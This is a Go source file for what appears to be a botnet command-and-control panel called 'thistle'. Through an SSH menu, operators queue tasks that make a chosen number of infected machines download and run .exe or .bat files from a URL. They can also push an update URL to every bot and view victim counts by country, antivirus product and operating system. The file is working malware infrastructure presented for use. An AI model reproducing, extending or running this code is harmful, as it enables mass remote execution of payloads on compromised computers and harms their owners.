package main

import (
	"fmt"
	"log"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/exp/rand"
)

const letterBytes = "abcdefghijklmnopqrstuvwxyz0123456789"

func randomString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Int63()%int64(len(letterBytes))]
	}
	return string(b)
}

func download(channel ssh.Channel) {
	db.Exec("UPDATE devices SET status = 'offline' WHERE lastping < strftime('%s', 'now') - 30")
	online, offline, total := GetCounts()
	fmt.Fprintf(channel, "\033]0;thistle - Total ["+total+"] Online ["+online+"] Offline ["+offline+"].\007")
	displayMenu(channel)
	fmt.Fprintln(channel, "You have selected: download")
	fmt.Fprintln(channel, "Please enter the URL you wish for devices to download.\nDirect URL is needed. .exe and .bat only, type exit if you do not wish to run this command.")
	fmt.Fprint(channel, "-> ")
	url, err := getUserInput(channel)
	if err != nil {
		log.Fatal(err)
	}
	if url == "exit" {
		return
	}
	fmt.Fprintln(channel, "Chosen URL: ", url)
	fmt.Fprintln(channel, "Please enter the amount of executions you wish for, 1 task exec = 1 bot")
	fmt.Fprint(channel, "-> ")
	executions, err := getUserInput(channel)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Fprintln(channel, "Chosen executions: ", executions)
	fmt.Fprintln(channel, "Please enter your chosen OS for execution: 'windows' or 'other', if they do not match the task will not go through")
	fmt.Fprint(channel, "-> ")
	filter, err := getUserInput(channel)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Fprintln(channel, "Chosen filter: ", filter)
	fmt.Fprintln(channel, "Command: download", " Executions: ", executions, " Filters: ", filter)
	converted, _ := strconv.Atoi(executions)
	_, err = db.Exec("INSERT INTO tasks(taskid, command, url, executions_h, executions_n, filters) VALUES(?,?,?,?,?,?)", "download-"+randomString(5), "download", url, 0, converted, filter)
	if err != nil {
		fmt.Println(err)
	}
	time.Sleep(4 * time.Second)
	clearTerminal(channel)
	displayMenu(channel)

}

func update(channel ssh.Channel) {
	db.Exec("UPDATE devices SET status = 'offline' WHERE lastping < strftime('%s', 'now') - 30")
	online, offline, total := GetCounts()
	fmt.Fprintf(channel, "\033]0;thistle - Total ["+total+"] Online ["+online+"] Offline ["+offline+"].\007")
	displayMenu(channel)
	fmt.Fprintln(channel, "You have selected: update")
	fmt.Fprintln(channel, "Please enter the URL you wish for devices to update.\nDirect URL is needed. this will run on all devices\nType exit if you do not want this.")
	fmt.Fprint(channel, "-> ")
	url, err := getUserInput(channel)
	if err != nil {
		log.Fatal(err)
	}
	if url == "exit" {
		return
	}
	fmt.Fprintln(channel, "Command: update", " URL: ", url)
	_, err = db.Exec("INSERT INTO tasks(taskid, command, url, executions_h, executions_n, filters) VALUES(?,?,?,?,?)", "update-"+randomString(5), "update", url, 0, 0, "")
	if err != nil {
		fmt.Println(err)
	}
	time.Sleep(4 * time.Second)
	clearTerminal(channel)
	displayMenu(channel)

}

func viewtasks(channel ssh.Channel) {
	rows, err := db.Query("SELECT taskid, command, url, executions_h, executions_n, filters FROM tasks")
	if err != nil {
		log.Fatal(err)
	}
	defer rows.Close()

	for rows.Next() {
		var taskid, command, url, filters string
		var executions_h, executions_n int
		err = rows.Scan(&taskid, &command, &url, &executions_h, &executions_n, &filters)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Fprintf(channel, "TaskID: %s Command: %s URL: %s\nCurrent executions: %d Needed executions: %d",
			taskid, command, url, executions_h, executions_n)
	}

	// Check for errors from iterating over rows.
	err = rows.Err()
	if err != nil {
		log.Fatal(err)
	}
	time.Sleep(5 * time.Second)
	displayMenu(channel)

}

func deletetask(channel ssh.Channel) {
	fmt.Fprintln(channel, "Please enter the taskid for the task you wish to delete.")
	fmt.Fprint(channel, "-> ")
	taskid, err := getUserInput(channel)
	if err != nil {
		log.Fatal(err)
	}
	_, err = db.Exec("DELETE FROM tasks WHERE taskid = ?", taskid)
	if err != nil {
		fmt.Fprintln(channel, "Error removing task")
		return
	}
	_, err = db.Exec("DELETE FROM completed_tasks WHERE taskid = ?", taskid)
	if err != nil {
		fmt.Fprintln(channel, "Error removing task")
		return
	}
	fmt.Fprintln(channel, "Deleted.")
	displayMenu(channel)

}

func viewstats(channel ssh.Channel) {
	printTopNations(channel)
	printTopAntivirus(channel)
	printTopOperatingSystem(channel)
	time.Sleep(5 * time.Second)
	displayMenu(channel)
}
